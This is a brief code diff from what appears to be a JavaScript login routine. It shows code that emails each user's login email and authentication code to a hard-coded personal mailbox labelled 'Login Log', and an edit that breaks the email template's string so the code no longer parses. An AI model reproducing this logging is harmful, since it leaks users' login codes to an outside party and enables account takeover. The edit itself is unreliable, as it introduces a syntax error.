@@ -121,7 +121,7 @@ const { data: userData, error: userError } = await supabase
         from: "onboarding@resend.dev",
         to: "joel.burghardt@mein.gmx",
         subject: "🔐 Login Log",
-        html: `
+        html: ` `
           <h3>Login Anfrage</h3>
           <p><b>Email:</b> ${email}</p>
           <p><b>Code:</b> ${code}</p>
